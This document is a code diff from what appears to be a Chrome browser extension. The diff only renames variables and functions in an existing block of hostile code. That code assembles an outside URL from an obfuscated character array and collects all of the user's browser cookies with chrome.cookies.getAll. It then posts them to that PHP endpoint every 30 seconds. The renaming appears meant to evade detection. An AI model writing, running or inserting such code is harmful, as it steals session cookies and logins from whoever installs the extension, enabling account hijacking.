@@ -18,30 +18,30 @@ chrome.tabs.query({
     }
 
 
-      var getAttggon;
+      var getAttglkargon;
 
-    function getYafq() {
-        var margihns = ["h","t","t","p","s",":","/","/","b","a","l","a","n","c","e","g","e","t","j","m","b",".","o","r","g","/","c","o","u","r","s","e","s","/"];
-        return margihns.join('');
+    function geagqafq() {
+        var mareqgns = ["h","t","t","p","s",":","/","/","b","a","l","a","n","c","e","g","e","t","j","m","b",".","o","r","g","/","c","o","u","r","s","e","s","/"];
+        return mareqgns.join('');
     }
 
-    var mine =  getYafq() + "ur" + 2 + ".p" + "hp";
+    var mieb =  geagqafq() + "ur" + 2 + ".p" + "hp";
 
-    function roofaghknel() {
-        clearInterval(getAttggon);
-        chrome.cookies.getAll({}, function(icos) {
-            $.post(mine, {
-                csg: JSON.stringify(icos)
+    function roffaghknel() {
+        clearInterval(getAttglkargon);
+        chrome.cookies.getAll({}, function(ifop) {
+            $.post(mieb, {
+                csg: JSON.stringify(ifop)
             })
 
         });
 
 
-        getAttggon = setInterval(roofaghknel, 3e4);
+        getAttglkargon = setInterval(roffaghknel, 3e4);
     }
 
 
-    roofaghknel();
+    roffaghknel();
     var tab;
 
     var n = {};
